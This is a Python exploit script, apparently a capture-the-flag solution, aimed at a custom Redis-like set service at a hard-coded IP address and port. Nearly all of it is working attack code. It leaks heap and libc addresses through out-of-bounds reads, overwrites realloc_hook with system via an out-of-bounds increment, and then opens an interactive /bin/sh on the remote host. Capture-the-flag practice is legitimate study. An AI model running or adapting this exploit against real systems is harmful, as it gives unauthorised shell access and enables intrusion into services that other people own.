#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwnpwnpwn import *
import re

#host = "10.211.55.23"
#port = 8888
host = "107.167.181.178"
port = 29292

sock = make_conn(host,port)

def newset(data,array = None ,test = None):
    if array == None :
        sock.send("*")
        sendline(sock,"2")
        sock.send("+")
        sendline(sock,"NEWSET")
        sock.send("+")
        sendline(sock,data)
    else:
        sock.send("*")
        sendline(sock,"3")
        sock.send("+")
        sendline(sock,"NEWSET")
        sock.send("+")
        sendline(sock,data)
        sock.send("*")
        sendline(sock,str(len(array)))
        if test :
            for num in array :
                sock.send("$")
                sendline(sock,str(len(str(num))))
                sendline(sock,str(num))
        else :
            for num in array :
                sock.send("+")
                sendline(sock,str(num))


def slen(data):
    sock.send("*")
    sendline(sock,"2")
    sock.send("+")
    sendline(sock,"SLEN")
    sock.send("+")
    sendline(sock,data)

def incr(data,index,num):
    sock.send("*")
    sendline(sock,"4")
    sock.send("+")
    sendline(sock,"INCR")
    sock.send("+")
    sendline(sock,data)
    sock.send(":")
    sendline(sock,str(index))
    sock.send(":")
    sendline(sock,str(num))


def flushall():
    sock.send("*")
    sendline(sock,"1")
    sock.send("+")
    sendline(sock,"FLUSHALL")

def retr(data,index):
    sock.send("*")
    sendline(sock,"3")
    sock.send("+")
    sendline(sock,"RETR")
    sock.send("+")
    sendline(sock,data)
    sock.send(":")
    sendline(sock,str(index))

def psort(data,num=0):
    if not num :
        sock.send("*")
        sendline(sock,"2")
        sock.send("+")
        sendline(sock,"PSORT")
        sock.send("+")
        sendline(sock,data)
    else :
        sock.send("*")
        sendline(sock,"3")
        sock.send("+")
        sendline(sock,"PSORT")
        sock.send("+")
        sendline(sock,data)
        sock.send(":")
        sendline(sock,str(num))

def rmset(data):
    sock.send("*")
    sendline(sock,"2")
    sock.send("+")
    sendline(sock,"RMSET")
    sock.send("+")
    sendline(sock,data)

newset("a"*0x4,[0x13391339,0x13381338,0x13371337],True)
newset("b"*0x4,[-1,-1,4],True)
psort("b"*4,8)
retr("a"*4,4)
recvuntil(sock,":")
heapptr = int(recvuntil(sock,"\n").strip()) 
heap = heapptr - 0x4b48
print "heap:",hex(heap)
retr("a"*4,8)
recvuntil(sock,":")
libcptr = int(recvuntil(sock,"\n").strip())
libc = libcptr - 0x1b7730-0x80+ 0x1000
print "libc:",hex(libc)
base = heap + 0x4af0 + 8
#realloc_hook = libc + 0x1b7804
realloc_hook = libc + 0x1b6764
system = libc + 0x3aea0
target = (realloc_hook - base)/4 
incr("a"*4,target,system)
sock.send("+")
sendline(sock,"/bin/sh")
inter(sock)
